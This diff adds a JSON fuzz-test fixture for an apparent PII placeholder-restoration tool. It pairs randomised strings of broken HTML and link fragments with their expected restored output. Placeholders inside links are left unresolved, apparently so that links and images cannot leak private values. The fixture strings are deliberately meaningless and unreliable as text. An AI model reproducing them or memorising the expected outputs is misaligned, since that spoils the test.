+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "=  [LITERAL_1]www.)[PERSON_2]",
+   "restored": "=  [PERSON_1]www.)[PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'\n[PERSON_2]  https://=",
+   "restored": "'\nKaren Example  https://=",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1)<a href=[EMAIL_2]www.[1]:",
+   "restored": "anna@example.org)<a href=[EMAIL_2]www.[1]:",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON_1=PERSON_1](\n\n(<img src='[URL_WITH_TOKEN_1]>PERSON_12<img src='",
+   "restored": "Anna Petrova=PERSON_1](\n\n(<img src='[URL_WITH_TOKEN_1]>PERSON_12<img src='",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_12",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ")PERSON[1]:PERSONé[//\n\nPERSON'[PERSON_1]",
+   "restored": ")PERSON[1]:PERSONé[//\n\nPERSON'Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "<a href=PERSON_1",
+   "restored": "<a href=PERSON_1",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ".PERSON 2https://[EMAIL_2]PERSON_1<https:![a]'[EMAIL_1]\n=[1]:www.[",
+   "restored": ".PERSON 2https://[EMAIL_2]PERSON_1<https:![a]'[EMAIL_1]\n=[1]:www.[",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'\n\n",
+   "restored": "'\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "\"_ _PERSON 2![a]\n\n_",
+   "restored": "\"_ _PERSON 2![a]\n\n_",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]é(PERSON_12//)]](https://]//https://PERSON 2",
+   "restored": "[PERSON_1]é(PERSON_12//)]](https://]//https://PERSON 2",
+   "unresolved": [
+    [
+     "PERSON_12",
+     "not_in_mapping"
+    ],
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "''\n",
+   "restored": "''\n",
+   "unresolved": []
+  },
+  {
+   "text": "(<img src='",
+   "restored": "(<img src='",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]éx",
+   "restored": "[PERSON_1]éx",
+   "unresolved": []
+  },
+  {
+   "text": "https://[PERSON_1]_ ",
+   "restored": "https://[PERSON_1]_ ",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'<img src='[LITERAL_1]",
+   "restored": "'<img src='[LITERAL_1]",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1].PERSONhttps://\"[EMAIL_2]2\n\n]([URL_WITH_TOKEN_1]  =",
+   "restored": "https://intranet.example/doc?token=abc.PERSONhttps://\"[EMAIL_2]2\n\n]([URL_WITH_TOKEN_1]  =",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![a][EMAIL_2]<a href=[PERSON_1]<é![a]PERSON_1PERSON 2www.<img src='([EMAIL_2]<img src='",
+   "restored": "![a][EMAIL_2]<a href=[PERSON_1]<é![a]PERSON_1PERSON 2www.<img src='([EMAIL_2]<img src='",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]](<https:   PERSON<<a href=",
+   "restored": "[EMAIL_2]](<https:   PERSON<<a href=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "2[person-1]PERSON_1",
+   "restored": "2Anna PetrovaPERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": "  ",
+   "restored": "  ",
+   "unresolved": []
+  },
+  {
+   "text": "é[EMAIL_1]\"PERSON//EMAIL_1é\n\né(]<https:[PERSON_1]",
+   "restored": "éanna@example.org\"PERSON//EMAIL_1é\n\né(]<https:[PERSON_1]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]<a href=//https://[EMAIL_1][LITERAL_1]",
+   "restored": "anna@example.org<a href=//https://[EMAIL_1][LITERAL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_2][PERSON_2]=[URL_WITH_TOKEN_1]<a href=<)[](EMAIL_1<img src='<https:",
+   "restored": "Karen ExampleKaren Example=https://intranet.example/doc?token=abc<a href=<)[](EMAIL_1<img src='<https:",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ")'<https:[1]:<[LITERAL_1]2",
+   "restored": ")'<https:[1]:<[LITERAL_1]2",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "//https://PERSON 2PERSON_1EMAIL_1PERSON",
+   "restored": "//https://PERSON 2PERSON_1EMAIL_1PERSON",
+   "unresolved": []
+  },
+  {
+   "text": "=PERSON 2![a]é\n\né](<img src='.[EMAIL_1][URL_WITH_TOKEN_1][1]:](",
+   "restored": "=Karen Example![a]é\n\né](<img src='.[EMAIL_1][URL_WITH_TOKEN_1][1]:](",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " =[EMAIL_1]",
+   "restored": " =anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": " ",
+   "restored": " ",
+   "unresolved": []
+  },
+  {
+   "text": "(![a]<[PERSON_1]PERSON_1_\n\n[URL_WITH_TOKEN_1]",
+   "restored": "(![a]<Anna PetrovaPERSON_1_\n\nhttps://intranet.example/doc?token=abc",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1]PERSON 2_\n\"",
+   "restored": "Anna PetrovaPERSON 2_\n\"",
+   "unresolved": []
+  },
+  {
+   "text": " [PERSON_1]",
+   "restored": " Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": ")](><a href=[PERSON_1] PERSON'PERSON(x",
+   "restored": ")](><a href=[PERSON_1] PERSON'PERSON(x",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "]<https:",
+   "restored": "]<https:",
+   "unresolved": []
+  },
+  {
+   "text": "  \n\n][URL_WITH_TOKEN_1]=[EMAIL_1]PERSON 2\"<img src='",
+   "restored": "  \n\n]https://intranet.example/doc?token=abc=[EMAIL_1]PERSON 2\"<img src='",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON\n<x[LITERAL_1]<img src='\"[[PERSON_2](",
+   "restored": "PERSON\n<x[PERSON_1]<img src='\"[[PERSON_2](",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " [EMAIL_1][URL_WITH_TOKEN_1].",
+   "restored": " anna@example.orghttps://intranet.example/doc?token=abc.",
+   "unresolved": []
+  },
+  {
+   "text": "2.\n<[https://",
+   "restored": "2.\n<[https://",
+   "unresolved": []
+  },
+  {
+   "text": " =//[EMAIL_2][1]:)(2[EMAIL_2][1]:",
+   "restored": " =//[EMAIL_2][1]:)(2[EMAIL_2][1]:",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "//EMAIL_1([//é[1]:2  [1]:]PERSON[EMAIL_2]_",
+   "restored": "//EMAIL_1([//é[1]:2  [1]:]PERSON[EMAIL_2]_",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON[EMAIL_1]\n[person-1] [LITERAL_1]_2_[EMAIL_2]",
+   "restored": "PERSONanna@example.org\nAnna Petrova [PERSON_1]_2_[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "_EMAIL_1  =]]((PERSONx[EMAIL_1][LITERAL_1]",
+   "restored": "_EMAIL_1  =]]((PERSONx[EMAIL_1][LITERAL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2=https://PERSON 2<PERSON_1",
+   "restored": "Karen Example=https://PERSON 2<Anna Petrova",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![a]",
+   "restored": "![a]",
+   "unresolved": []
+  },
+  {
+   "text": "<img src='[EMAIL_2][LITERAL_1]\n\n[EMAIL_1](PERSON[EMAIL_2]",
+   "restored": "<img src='[EMAIL_2][LITERAL_1]\n\n[EMAIL_1](PERSON[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "'](<\"[PERSON_1]//[EMAIL_2]https://<_['",
+   "restored": "'](<\"[PERSON_1]//[EMAIL_2]https://<_['",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "éPERSON_1'EMAIL_1'2<https:[EMAIL_2]PERSON_1https:////'",
+   "restored": "éPERSON_1'anna@example.org'2<https:[EMAIL_2]PERSON_1https:////'",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " [PERSON_2]. ",
+   "restored": " Karen Example. ",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2]é",
+   "restored": "Karen Exampleé",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1]//",
+   "restored": "Anna Petrova//",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]2<a href=",
+   "restored": "https://intranet.example/doc?token=abc2<a href=",
+   "unresolved": []
+  },
+  {
+   "text": ">[URL_WITH_TOKEN_1].//]www. [PERSON_1][PERSON_2]\"[URL_WITH_TOKEN_1]é_x",
+   "restored": ">https://intranet.example/doc?token=abc.//]www. Anna PetrovaKaren Example\"https://intranet.example/doc?token=abcé_x",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1PERSON_1[person-1])=x]( =[1]:[[person-1]<\"",
+   "restored": "PERSON_1PERSON_1Anna Petrova)=x]( =[1]:[[person-1]<\"",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![a]<img src='[LITERAL_1].PERSON_1![a]](<  ",
+   "restored": "![a]<img src='[LITERAL_1].PERSON_1![a]](<  ",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON  >'<https:[PERSON_1]",
+   "restored": "PERSON  >'<https:[PERSON_1]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ".x\"[1]:[PERSON_2]https://",
+   "restored": ".x\"[1]:Karen Examplehttps://",
+   "unresolved": []
+  }
+ ]
+}
